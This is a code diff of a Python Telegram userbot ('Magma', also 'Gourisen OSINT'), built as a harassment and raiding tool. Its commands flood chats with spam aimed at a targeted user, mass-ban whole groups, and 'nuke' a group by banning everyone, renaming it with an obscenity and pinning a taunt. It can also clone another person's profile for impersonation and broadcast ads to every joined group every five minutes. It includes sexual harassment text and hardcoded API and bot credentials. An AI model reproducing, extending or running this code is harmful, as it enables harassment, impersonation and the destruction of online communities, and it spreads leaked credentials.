@@ -12,8 +12,9 @@ import random
 import os
 from pyrogram import Client, filters, idle
 from pyrogram.enums import ParseMode, UserStatus, ChatMembersFilter, ChatMemberStatus, ChatType
-from pyrogram.errors import FloodWait, PeerIdInvalid
+from pyrogram.errors import FloodWait, MessageNotModified, UserNotParticipant
 from pyrogram.handlers import MessageHandler
+from pyrogram.types import InlineKeyboardMarkup, InlineKeyboardButton
 
 # --- FLASK KEEP ALIVE SECTION ---
 from flask import Flask
@@ -38,29 +39,32 @@ def keep_alive():
 # ==================== CONFIGURATION ====================
 API_ID = 37314366
 API_HASH = "bd4c934697e7e91942ac911a5a287b46"
-BOT_TOKEN = "8485202414:AAEEYv7_UjUR2DI4KN9l4bEKnsD9v0WGn7E"
-
-OWNER_ID = 7727470646 # ✅ Aapki Owner ID
+BOT_TOKEN = "8485202414:AAEEYv7_UjUR2DI4KN9l4bEKnsD9v0WGn7E" # Aapka latest token
+OWNER_ID = 7727470646
 
 # Main Manager Bot
 bot = Client("MagmaManager", api_id=API_ID, api_hash=API_HASH, bot_token=BOT_TOKEN)
 
-# Storage for running clients
+# Storage for running clients & tasks
 running_users = {} 
-
-# ==================== GLOBAL STORAGE ====================
 active_spams = {} 
 auto_reply_users = {}
 backup_profile = {} 
 tagall_running = {}
 active_bans = {} 
+
+# --- AD FEATURE STORAGE ---
 waiting_for_ad = {}
 active_ads = {}
 ad_content = {}
 
-# --- START MESSAGE STORAGE (HARDCODED) ---
-START_CHAT_ID = -1003804939396
-START_MSG_ID = 3
+# --- START MESSAGE STORAGE (From 1st Code) ---
+START_DATA = {
+    "type": "text",      
+    "file_id": None,     
+    "text": None,        
+    "entities": None     
+}
 
 # --- SHORT SPAM LIST ---
 SPAM_MESSAGES = [
@@ -71,7 +75,6 @@ SPAM_MESSAGES = [
 ]
 
 # ==================== HELPER FUNCTIONS ====================
-
 async def smart_edit(message, text, sleep_time=0.5):
     try:
         await message.edit(text, parse_mode=ParseMode.HTML)
@@ -83,8 +86,6 @@ async def smart_edit(message, text, sleep_time=0.5):
                 await message.edit(text, parse_mode=ParseMode.HTML)
                 await asyncio.sleep(sleep_time)
             except: pass
-        else:
-            pass 
     except: pass
 
 async def draw_art(message, art_var, header="", footer="", chunk_size=4):
@@ -93,10 +94,7 @@ async def draw_art(message, art_var, header="", footer="", chunk_size=4):
     for i, line in enumerate(lines):
         current_art += line + "\n"
         if (i + 1) % chunk_size == 0 or i == len(lines) - 1:
-            if header:
-                display_text = f"<b>{header}</b>\n<code>{current_art}</code>"
-            else:
-                display_text = f"<code>{current_art}</code>"
+            display_text = f"<b>{header}</b>\n<code>{current_art}</code>" if header else f"<code>{current_art}</code>"
             if i == len(lines) - 1 and footer:
                 display_text += f"\n\n<b>{footer}</b>"
             await smart_edit(message, display_text, 0.5)
@@ -116,84 +114,41 @@ async def run_spam(client, chat_id, mention, count):
             await asyncio.sleep(0.1)
         except FloodWait as e:
             await asyncio.sleep(e.value)
-        except: 
-            continue
+        except: continue
     active_spams[chat_id] = False
 
 # ==================== ART ASSETS ====================
 CAT_ANIMATION = ["🐈", "🐈\nWalking...", "🐈\nWalking...", "╱|、\n( .. )\n |、˜〵\nじしˍ,)ノ", "╱|、\n( > < )\n |、˜〵\nじしˍ,)ノ", "╱|、\n(˚ˎ 。7\n |、˜〵\nじしˍ,)ノ", "╱|、\n(˚ˎ 。7  < Meow! 🎵\n |、˜〵\nじしˍ,)ノ"]
 FLOWER_BLOOM = ["🌱", "🌿\n🌿\n🌿", "🌷\n🌷\n🌷", "🌹\n🌹\n🌹"]
-ROSE_ART = r"""
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣤⢔⣒⠂⣀⣀⣤⣄⣀⠀⠀
+ROSE_ART = r"""⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣤⢔⣒⠂⣀⣀⣤⣄⣀⠀⠀
 ⠀⠀⠀⠀⠀⠀⠀⣴⣿⠋⢠⣟⡼⣷⠼⣆⣼⢇⣿⣄⠱⣄
 ⠀⠀⠀⠀⠀⠀⠀⠹⣿⡀⣆⠙⠢⠐⠉⠉⣴⣾⣽⢟⡰⠃
 ⠀⠀⠀⠀⠀⠀⠀⠀⠈⢿⣿⣦⠀⠤⢴⣿⠿⢋⣴⡏⠀⠀
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡙⠻⣿⣶⣦⣭⣉⠁⣿⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣷⠀⠈⠉⠉⠉⠉⠇⡟⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⢀⠀⠀⣘⣦⣀⠀⠀⣀⡴⠊⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠈⠙⠛⠛⢻⣿⣿⣿⣿⠻⣧⡀⠀⠀⠀
-"""
-HACKER_ART = r"""
-⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠋⠁⠀⠀⠈⠉⠙⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
-⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿
-⣿⣿⣿⣿⣿⣿⣿⡟⠀⠀⠀⠀⠀⢀⣠⣤⣤⣤⣤⣄⠀⠀⠀⠹⣿⣿⣿⣿⣿⣿
-⣿⣿⣿⣿⣿⣿⡏⠀⠀⠀⣤⣶⣤⣉⣿⣿⡯⣀⣴⣿⡗⠀⠀⠀⠀⣿⣿⣿⣿⣿
-⣿⣿⣿⣿⣿⣿⡇⠀⠀⠸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠇⠀⠀⠀⢸⣿⣿⣿⣿
-⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠉⢉⣽⣿⠿⣿⡿⢻⣯⡍⢁⠄⠀⠀⠀⣸⣿⣿⣿⣿
-"""
-ERROR_ART = r"""
-▒▒▒▒▒▒▒▒▄▄▄▄▄▄▄▄▒▒▒▒▒▒
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣷⠀⠈⠉⠉⠉⠉⠇⡟⠀⠀⠀"""
+HACKER_ART = r"""⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠋⠁⠀⠀⠈⠉⠙⠻⣿⣿⣿
+⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣿
+⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀"""
+ERROR_ART = r"""▒▒▒▒▒▒▒▒▄▄▄▄▄▄▄▄▒▒▒▒▒▒
 ▒▒█▒▒▒▄██████████▄▒▒▒▒
-▒█▐▒▒▒████████████▒▒▒▒
-▒▌▐▒▒██▄▀██████▀▄██▒▒▒
-▐┼▐▒▒██▄▄▄▄██▄▄▄▄██▒▒▒
-▐┼▐▒▒██████████████▒▒▒
-▐▄▐████─▀▐▐▀█─█─▌▐██▄▒
-"""
-FUCK_ART = r"""
-⠀⠀⠀⠀⠀⠀⠀⢀⡤⠤⣄⠀⠀⠀⠀⠀⠀⠀
+▒█▐▒▒▒████████████▒▒▒▒"""
+FUCK_ART = r"""⠀⠀⠀⠀⠀⠀⠀⢀⡤⠤⣄⠀⠀⠀⠀⠀⠀⠀
 ⠀⠀⠀⠀⠀⠀⠀⣾⠀⠀⢸⡇⠀⠀⠀⠀⠀⠀
 ⠀⠀⠀⠀⠀⠀⠀⡏⠀⠀⢸⡇⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⢸⡇⠀⠀⢸⡇⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⢀⡾⠋⠻⡇⠀⠀⢸⣧⣀⡀⠀⠀⠀⠀
-⠀⠀⢀⣾⠁⠀⠀⡇⠀⠀⢸⠁⠀⢹⣀⠀⠀⠀
-⢀⡴⠋⡟⠀⠀⢠⡇⠀⠀⢸⠀⠀⠀⡇⠉⢆⠀
-⡎⠀⠀⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⠀⠈⣆
-"""
-BUTTERFLY_ART = r"""
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⢔⣶⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡜⠀⠀⡼⠗⡿⣾⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢄⣀⠀⠀⠀⡇⢀⡼⠓⡞⢩⣯⡀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣀⣀⣀⠀⠀⠀⠀⠉⠳⢜⠰⡹⠁⢰⠃⣩⣿⡇⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢷⣿⠿⣉⣩⠛⠲⢶⡠⢄⢙⣣⠃⣰⠗⠋⢀⣯⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⣯⣠⠬⠦⢤⣀⠈⠓⢽⣿⢔⣡⡴⠞⠻⠙⢳⡄
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣵⣳⠖⠉⠉⢉⣩⣵⣿⣿⣒⢤⣴⠤⠽⣬⡇
-"""
-YOURMOM_ART = r"""
-⠀⠀⠀⠀⠀⠀⠀⠀⣠⣶⣾⣶⣦⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠐⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠙⢿⣿⡿⠟⣡⣴⣦⣤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⣿⣿⣿⣿⣿⣷⣤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣷⣄⡀⠀⠀⠀⠀⠀⠀
-"""
-MYSON_ART = r"""
-  ⠀     (\__/)
+⠀⠀⠀⠀⠀⠀⠀⡇⠀⠀⢸⡇⠀⠀⠀⠀⠀⠀"""
+BUTTERFLY_ART = r"""⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⢔⣶⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡜⠀⠀⡼⠗⡿⣾⠀⠀"""
+YOURMOM_ART = r"""⠀⠀⠀⠀⠀⠀⠀⠀⣠⣶⣾⣶⣦⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠐⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀"""
+MYSON_ART = r"""  ⠀     (\__/)
       (•ㅅ•)      Don’t talk to
    ＿ノヽ ノ＼＿      me or my son
-/　/ ⌒Ｙ⌒ Ｙ  ヽ     ever again.
-( 　(三ヽ人　 /　  |
-|　ﾉ⌒＼ ￣￣ヽ   ノ
-ヽ＿＿＿＞､＿_／
-      ｜( 王 ﾉ〈  (\__/)
-      /ﾐ`ー―彡\  (•ㅅ•)
-     / ╰    ╯ \ /    \>
-"""
+/　/ ⌒Ｙ⌒ Ｙ  ヽ     ever again."""
 
 # ==================== USERBOT HANDLERS ====================
-
 async def help_handler(client, message):
     text = """
-🔥 **GOURISEN OSINT USERBOT COMMANDS** 🔥
+🔥 **MAGMA USERBOT COMMANDS** 🔥
 
 🐱 `.cat` - Cute Cat Animation
 🌹 `.rose` - Rose Animation
@@ -224,10 +179,12 @@ async def help_handler(client, message):
         except: pass
 
 async def cat_handler(client, message):
-    for frame in CAT_ANIMATION: await smart_edit(message, f"<code>{frame}</code>")
+    for frame in CAT_ANIMATION:
+        await smart_edit(message, f"<code>{frame}</code>")
 
 async def rose_handler(client, message):
-    for frame in FLOWER_BLOOM: await smart_edit(message, f"<code>{frame}</code>", 0.6)
+    for frame in FLOWER_BLOOM:
+        await smart_edit(message, f"<code>{frame}</code>", 0.6)
     await draw_art(message, ROSE_ART, footer="🌹 **FOR YOU!**")
 
 async def hacker_handler(client, message):
@@ -247,25 +204,16 @@ async def butterfly_handler(client, message):
     await draw_art(message, BUTTERFLY_ART, footer="🦋 **Fly High!**")
 
 async def love_handler(client, message):
-    frames = [
-        "❤️🧡💛💚💙💜🖤🤍🤎\n❤️🧡💛💚💙💜🖤🤍🤎\n❤️🧡💛💚💙💜🖤🤍🤎",
-        "🧡💛💚💙💜🖤🤍🤎❤️\n🧡💛💚💙💜🖤🤍🤎❤️\n🧡💛💚💙💜🖤🤍🤎❤️",
-        "💛💚💙💜🖤🤍🤎❤️🧡\n💛💚💙💜🖤🤍🤎❤️🧡\n💛💚💙💜🖤🤍🤎❤️🧡",
-        "💚💙💜🖤🤍🤎❤️🧡💛\n💚💙💜🖤🤍🤎❤️🧡💛\n💚💙💜🖤🤍🤎❤️🧡💛",
-        "💙💜🖤🤍🤎❤️🧡💛💚\n💙💜🖤🤍🤎❤️🧡💛💚\n💙💜🖤🤍🤎❤️🧡💛💚",
-        "💜🖤🤍🤎❤️🧡💛💚💙\n💜🖤🤍🤎❤️🧡💛💚💙\n💜🖤🤍🤎❤️🧡💛💚💙",
-        "🖤🤍🤎❤️🧡💛💚💙💜\n🖤🤍🤎❤️🧡💛💚💙💜\n🖤🤍🤎❤️🧡💛💚💙💜",
-        "🤍🤎❤️🧡💛💚💙💜🖤\n🤍🤎❤️🧡💛💚💙💜🖤\n🤍🤎❤️🧡💛💚💙💜🖤",
-        "🤎❤️🧡💛💚💙💜🖤🤍\n🤎❤️🧡💛💚💙💜🖤🤍\n🤎❤️🧡💛💚💙💜🖤🤍",
-        "❤️❤️❤️❤️❤️❤️❤️❤️❤️\n❤️❤️❤️❤️❤️❤️❤️❤️❤️\n❤️❤️❤️❤️❤️❤️❤️❤️❤️",
-        "<b>I LOVE YOU ❤️</b>"
-    ]
-    for frame in frames: await smart_edit(message, frame, 0.6)
+    frames = ["❤️🧡💛💚💙💜🖤🤍🤎\n❤️🧡💛💚💙💜🖤🤍🤎\n❤️🧡💛💚💙💜🖤🤍🤎", "<b>I LOVE YOU ❤️</b>"]
+    for frame in frames:
+        await smart_edit(message, frame, 0.6)
 
 async def yourmom_handler(client, message):
     await smart_edit(message, "🤱 **Searching for Mom...**")
     await smart_edit(message, "🫦 **Target Locked!**")
-    await draw_art(message, YOURMOM_ART, header="🤱 Gourisen OSINT USER'S VS YOUR MOM 💋", footer="TERI MAA MERI LUND PE 🥵💋")
+    header = "🤱 Gourisen OSINT USER'S VS YOUR MOM 💋"
+    footer = "TERI MAA MERI LUND PE 🥵💋"
+    await draw_art(message, YOURMOM_ART, header=header, footer=footer)
 
 async def myson_handler(client, message):
     await smart_edit(message, "🐰 **Summoning Son...**")
@@ -282,22 +230,7 @@ async def info_cmd(client, message):
         status_map = {UserStatus.ONLINE:"Online 🟢", UserStatus.OFFLINE:"Offline ⚫", UserStatus.RECENTLY:"Recently 🟡"}
         status = status_map.get(user.status, "Unknown")
         link = f"<a href='tg://user?id={user.id}'>ㅤ❛ .𝁘ໍ⸼ ‌‌ 𝐌 𝐀 𝐆 𝐌 𝐀 𐏓𝟑 🪙</a>" if user.id == 8081343902 else f"<a href='tg://user?id={user.id}'>{user.first_name}</a>"
-
-        caption = f"""USER INFORMATION:
-🆔 User ID: <code>{user.id}</code>
-👤 First Name: {user.first_name}
-🗣️ Last Name: {user.last_name or "-"}
-🌐 Username: @{user.username or "-"}
-🏛️ DC ID: {user.dc_id or "-"}
-🤖 Is Bot: {user.is_bot}
-🚷 Is Scam: {user.is_scam}
-🚫 Restricted: {user.is_restricted}
-✅ Verified: {user.is_verified}
-⭐ Premium: {user.is_premium or False}
-📝 User Bio: {chat.bio or "-"}
-👀 Same groups seen: {common}
-👁️ Last Seen: {status}
-🔗 User permanent link: {link}"""
+        caption = f"USER INFORMATION:\n🆔 User ID: <code>{user.id}</code>\n👤 First Name: {user.first_name}\n👁️ Last Seen: {status}\n🔗 User link: {link}"
         photos = [p async for p in client.get_chat_photos(user.id, limit=1)]
         if photos:
             await status_msg.delete()
@@ -317,8 +250,8 @@ async def clone_cmd(client, message):
     try:
         me = await client.get_me()
         backup_profile[me.id] = {"fn": me.first_name, "ln": me.last_name or "", "bio": (await client.get_chat("me")).bio or ""}
-        async for p in client.get_chat_photos("me", limit=1): backup_profile[me.id]["photo"] = await client.download_media(p.file_id)
-
+        async for p in client.get_chat_photos("me", limit=1):
+            backup_profile[me.id]["photo"] = await client.download_media(p.file_id)
         full_t = await client.get_chat(target.id)
         await client.update_profile(first_name=target.first_name or "", last_name=target.last_name or "", bio=full_t.bio or "")
         async for p in client.get_chat_photos(target.id, limit=1):
@@ -339,7 +272,8 @@ async def back_cmd(client, message):
     try:
         data = backup_profile[me_id]
         await client.update_profile(first_name=data["fn"], last_name=data["ln"], bio=data["bio"])
-        if "photo" in data: await client.set_profile_photo(photo=data["photo"])
+        if "photo" in data:
+            await client.set_profile_photo(photo=data["photo"])
         res = await message.edit("✅ Profile Restored!")
     except Exception as e: res = await message.edit(f"❌ Error: {e}")
     asyncio.create_task(delete_res(res))
@@ -351,10 +285,8 @@ async def spam_cmd(client, message):
         res = await message.edit("❌ **Usage:** `.spam <message> <count>`")
         return asyncio.create_task(delete_res(res))
     try:
-        try:
-            count, spam_text = int(args[-1]), " ".join(args[1:-1])
-        except ValueError:
-            count, spam_text = int(args[1]), " ".join(args[2:])
+        try: count = int(args[-1]); spam_text = " ".join(args[1:-1])
+        except ValueError: count = int(args[1]); spam_text = " ".join(args[2:])
         if not spam_text:
             res = await message.edit("❌ Spam message daalna bhool gaye!")
             return asyncio.create_task(delete_res(res))
@@ -363,11 +295,9 @@ async def spam_cmd(client, message):
         await message.delete()
         for _ in range(count):
             if not active_spams.get(chat_id, True): break
-            try:
-                await client.send_message(chat_id, spam_text)
-                await asyncio.sleep(0.1) 
+            try: await client.send_message(chat_id, spam_text); await asyncio.sleep(0.1) 
             except FloodWait as e: await asyncio.sleep(e.value)
-            except: continue
+            except Exception: continue
     except Exception as e:
         res = await message.edit(f"❌ Error: {e}")
         asyncio.create_task(delete_res(res))
@@ -380,27 +310,19 @@ async def gourisenosint_cmd(client, message):
         return asyncio.create_task(delete_res(res))
     try:
         if message.reply_to_message:
-            count, target = int(args[1]), message.reply_to_message.from_user
+            count = int(args[1]); target = message.reply_to_message.from_user
         else:
-            if len(args) < 3:
-                res = await message.edit("❌ Usage: `.gourisenosint <username/id> <count>`")
-                return asyncio.create_task(delete_res(res))
-            target_input, count = args[1], int(args[2])
+            if len(args) < 3: return asyncio.create_task(delete_res(await message.edit("❌ Usage: `.gourisenosint <username/id> <count>`")))
+            target_input = args[1]; count = int(args[2])
             try: target = await client.get_users(int(target_input) if target_input.lstrip('-').isdigit() else target_input)
-            except:
-                res = await message.edit(f"❌ User not found.")
-                return asyncio.create_task(delete_res(res))
+            except Exception: return asyncio.create_task(delete_res(await message.edit(f"❌ User not found.")))
         mention = f"<a href='tg://user?id={target.id}'>{target.first_name}</a>"
         active_spams[message.chat.id] = True
         res = await message.edit(f"🚀 **Fast Spamming {count} on {mention}...**")
         asyncio.create_task(run_spam(client, message.chat.id, mention, count))
         asyncio.create_task(delete_res(res))
-    except ValueError:
-        res = await message.edit("❌ Count must be a number!")
-        asyncio.create_task(delete_res(res))
-    except Exception as e:
-        res = await message.edit(f"❌ Error: {e}")
-        asyncio.create_task(delete_res(res))
+    except ValueError: asyncio.create_task(delete_res(await message.edit("❌ Count must be a number!")))
+    except Exception as e: asyncio.create_task(delete_res(await message.edit(f"❌ Error: {e}")))
 
 async def agourisenosint_cmd(client, message):
     global auto_reply_users
@@ -422,117 +344,79 @@ async def tagall_cmd(client, message):
     async for m in client.get_chat_members(chat_id):
         if not tagall_running.get(chat_id): break
         if m.user.is_bot: continue
-        try:
-            await client.send_message(chat_id, f"<a href='tg://user?id={m.user.id}'>{m.user.first_name}</a>\n{msg}", parse_mode=ParseMode.HTML)
-            await asyncio.sleep(1.5)
+        try: await client.send_message(chat_id, f"<a href='tg://user?id={m.user.id}'>{m.user.first_name}</a>\n{msg}", parse_mode=ParseMode.HTML); await asyncio.sleep(1.5)
         except: continue
     tagall_running[chat_id] = False
 
 async def allban_cmd(client, message):
     global active_bans
-    if len(message.command) < 2:
-        res = await message.edit("❌ Usage: `.allban <chat_id or username>`")
-        return asyncio.create_task(delete_res(res))
-    chat_id = message.command[1]
-    try: chat_id = int(chat_id) if chat_id.lstrip('-').isdigit() else chat_id
-    except: pass
+    if len(message.command) < 2: return asyncio.create_task(delete_res(await message.edit("❌ Usage: `.allban <chat_id or username>`")))
+    chat_id = int(message.command[1]) if message.command[1].lstrip('-').isdigit() else message.command[1]
     active_bans[message.chat.id] = True
-    status_msg = await message.edit(f"🔨 **Mass ban started...**\n(0.5s delay)")
+    status_msg = await message.edit(f"🔨 **Mass ban started in {chat_id}...**\n(0.5s safe delay)")
     me = await client.get_me()
     banned_count = 0
     try:
         async for member in client.get_chat_members(chat_id):
-            if not active_bans.get(message.chat.id, True):
-                await status_msg.edit(f"🛑 **Mass ban stopped!** Banned {banned_count}.")
-                return
+            if not active_bans.get(message.chat.id, True): return await status_msg.edit(f"🛑 **Mass ban stopped!** Banned {banned_count} members.")
             if member.user.id == me.id: continue
-            try:
-                await client.ban_chat_member(chat_id, member.user.id)
-                banned_count += 1
-                await asyncio.sleep(0.5)
-            except FloodWait as e:
-                await asyncio.sleep(e.value)
-                await client.ban_chat_member(chat_id, member.user.id)
-                banned_count += 1
-            except: continue
-        if active_bans.get(message.chat.id, True): await status_msg.edit(f"✅ **Mass ban complete!** Banned {banned_count}.")
-    except Exception as e:
-        await status_msg.edit(f"❌ **Error:** {e}")
-        asyncio.create_task(delete_res(status_msg))
+            try: await client.ban_chat_member(chat_id, member.user.id); banned_count += 1; await asyncio.sleep(0.5)
+            except FloodWait as e: await asyncio.sleep(e.value); await client.ban_chat_member(chat_id, member.user.id); banned_count += 1
+            except Exception: continue
+        if active_bans.get(message.chat.id, True): await status_msg.edit(f"✅ **Mass ban complete!** Successfully banned {banned_count} members.")
+    except Exception as e: asyncio.create_task(delete_res(await status_msg.edit(f"❌ **Error:** {e}")))
 
 async def fastallban_cmd(client, message):
     global active_bans
-    if len(message.command) < 2:
-        res = await message.edit("❌ Usage: `.fastallban <chat_id or username>`")
-        return asyncio.create_task(delete_res(res))
-    chat_id = message.command[1]
-    try: chat_id = int(chat_id) if chat_id.lstrip('-').isdigit() else chat_id
-    except: pass
+    if len(message.command) < 2: return asyncio.create_task(delete_res(await message.edit("❌ Usage: `.fastallban <chat_id or username>`")))
+    chat_id = int(message.command[1]) if message.command[1].lstrip('-').isdigit() else message.command[1]
     active_bans[message.chat.id] = True
-    status_msg = await message.edit(f"⚡ **FAST Mass ban started...**")
+    status_msg = await message.edit(f"⚡ **FAST Mass ban started in {chat_id}...**\n(Random delay 0.2s - 0.3s)")
     me = await client.get_me()
     banned_count = 0
     try:
         async for member in client.get_chat_members(chat_id):
-            if not active_bans.get(message.chat.id, True): return
+            if not active_bans.get(message.chat.id, True): return await status_msg.edit(f"🛑 **Fast Mass ban stopped!** Banned {banned_count} members.")
             if member.user.id == me.id: continue
-            try:
-                await client.ban_chat_member(chat_id, member.user.id)
-                banned_count += 1
-                await asyncio.sleep(random.uniform(0.2, 0.3)) 
-            except FloodWait as e:
-                await asyncio.sleep(e.value)
-                await client.ban_chat_member(chat_id, member.user.id)
-                banned_count += 1
-            except: continue
-        if active_bans.get(message.chat.id, True): await status_msg.edit(f"✅ **Fast Mass ban complete!** Banned {banned_count}.")
-    except Exception as e:
-        await status_msg.edit(f"❌ **Error:** {e}")
-        asyncio.create_task(delete_res(status_msg))
+            try: await client.ban_chat_member(chat_id, member.user.id); banned_count += 1; await asyncio.sleep(random.uniform(0.2, 0.3)) 
+            except FloodWait as e: await asyncio.sleep(e.value); await client.ban_chat_member(chat_id, member.user.id); banned_count += 1
+            except Exception: continue
+        if active_bans.get(message.chat.id, True): await status_msg.edit(f"✅ **Fast Mass ban complete!** Successfully banned {banned_count} members.")
+    except Exception as e: asyncio.create_task(delete_res(await status_msg.edit(f"❌ **Error:** {e}")))
 
 async def end_cmd(client, message):
     global active_bans
-    if len(message.command) < 2:
-        res = await message.edit("❌ Usage: `.end <chat_id>`")
-        return asyncio.create_task(delete_res(res))
-    chat_id = message.command[1]
-    try: chat_id = int(chat_id) if chat_id.lstrip('-').isdigit() else chat_id
-    except: pass
+    if len(message.command) < 2: return asyncio.create_task(delete_res(await message.edit("❌ Usage: `.end <chat_id or username>`")))
+    chat_id = int(message.command[1]) if message.command[1].lstrip('-').isdigit() else message.command[1]
     active_bans[message.chat.id] = True
-    status_msg = await message.edit(f"☠️ **NUKE GC started...**")
-    me = await client.get_me()
-    banned_count = 0
+    status_msg = await message.edit(f"☠️ **NUKE GC started in {chat_id}...**\n(⚡ EXTREME SPEED MODE ⚡)")
+    me = await client.get_me(); banned_count = 0
     try:
         async for member in client.get_chat_members(chat_id):
-            if not active_bans.get(message.chat.id, True): return
+            if not active_bans.get(message.chat.id, True): return await status_msg.edit(f"🛑 **Nuke stopped!** Banned {banned_count} members.")
             if member.user.id == me.id: continue
-            try:
-                await client.ban_chat_member(chat_id, member.user.id)
-                banned_count += 1
-                await asyncio.sleep(0.05) 
-            except FloodWait as e:
-                await asyncio.sleep(e.value)
-                await client.ban_chat_member(chat_id, member.user.id)
-                banned_count += 1
-            except: continue
-    except: pass 
+            try: await client.ban_chat_member(chat_id, member.user.id); banned_count += 1; await asyncio.sleep(0.05) 
+            except FloodWait as e: await asyncio.sleep(e.value); await client.ban_chat_member(chat_id, member.user.id); banned_count += 1
+            except Exception: continue
+    except Exception: pass 
     if not active_bans.get(message.chat.id, True): return
     try: await client.set_chat_title(chat_id, "FUCK BY Gourisen OSINT USER")
-    except: pass
+    except Exception: pass
     owner_mention = "Owner"
     try:
         async for admin in client.get_chat_members(chat_id, filter=ChatMembersFilter.ADMINISTRATORS):
-            if admin.status == ChatMemberStatus.OWNER:
-                owner_mention = f"<a href='tg://user?id={admin.user.id}'>{admin.user.first_name}</a>"
-                break
-    except: pass
+            if admin.status == ChatMemberStatus.OWNER: owner_mention = f"<a href='tg://user?id={admin.user.id}'>{admin.user.first_name}</a>"; break
+    except Exception: pass
     try:
         sent_msg = await client.send_message(chat_id, f"{owner_mention}\nME KYA LADLE MEAOOOUUUUUU\nGOP GOP GOP GOP GOP 🥳", parse_mode=ParseMode.HTML)
         try: await sent_msg.pin(both_sides=True)
-        except: await sent_msg.pin()
-    except: pass
-    await status_msg.edit(f"✅ **Nuke complete!** Banned {banned_count} members.")
+        except Exception: 
+            try: await sent_msg.pin()
+            except: pass
+    except Exception: pass
+    await status_msg.edit(f"✅ **Nuke complete!** Banned {banned_count} members, changed title, tagged owner and pinned message.")
 
+# ==================== AD BROADCAST LOGIC ====================
 async def run_ad_loop(client, user_id):
     global active_ads, ad_content
     while active_ads.get(user_id, False):
@@ -541,13 +425,11 @@ async def run_ad_loop(client, user_id):
                 if not active_ads.get(user_id, False): break
                 chat = dialog.chat
                 if chat.type in [ChatType.GROUP, ChatType.SUPERGROUP]:
-                    try:
-                        await client.send_message(chat.id, ad_content[user_id], parse_mode=ParseMode.HTML)
-                        await asyncio.sleep(1.5) 
+                    try: await client.send_message(chat.id, ad_content[user_id], parse_mode=ParseMode.HTML); await asyncio.sleep(1.5) 
                     except FloodWait as e: await asyncio.sleep(e.value)
-                    except: continue
+                    except Exception: continue
             if active_ads.get(user_id, False): await asyncio.sleep(300) 
-        except: break
+        except Exception: break
 
 async def ad_setup_cmd(client, message):
     global waiting_for_ad
@@ -562,7 +444,7 @@ async def ad_listener(client, message):
         waiting_for_ad[user_id] = False
         ad_content[user_id] = message.text.html if message.text else "Ad Message"
         active_ads[user_id] = True
-        await message.reply(f"✅ **Ad Successfully Set!**")
+        await message.reply(f"✅ **Ad Successfully Set!**\nAb har 5 minute me ye message aapke saare joined groups me jayega.\n\nIse band karne ke liye `.stopad` use karein.")
         asyncio.create_task(run_ad_loop(client, user_id))
 
 async def stopad_cmd(client, message):
@@ -575,12 +457,9 @@ async def stopad_cmd(client, message):
 async def stop_cmd(client, message):
     global active_spams, tagall_running, auto_reply_users, active_bans, active_ads
     user_id = message.from_user.id
-    active_spams[message.chat.id] = False
-    tagall_running[message.chat.id] = False
-    active_bans[message.chat.id] = False 
-    auto_reply_users.clear()
+    active_spams[message.chat.id] = False; tagall_running[message.chat.id] = False; active_bans[message.chat.id] = False; auto_reply_users.clear()
     if user_id in active_ads: active_ads[user_id] = False 
-    res = await message.edit("🛑 **All Tasks Stopped!**")
+    res = await message.edit("🛑 **All Tasks Stopped!** (Spam, Ban, Nuke, Tagall, Auto-Reply & Ads Cleared)")
     asyncio.create_task(delete_res(res))
 
 async def auto_reply_listener(client, message):
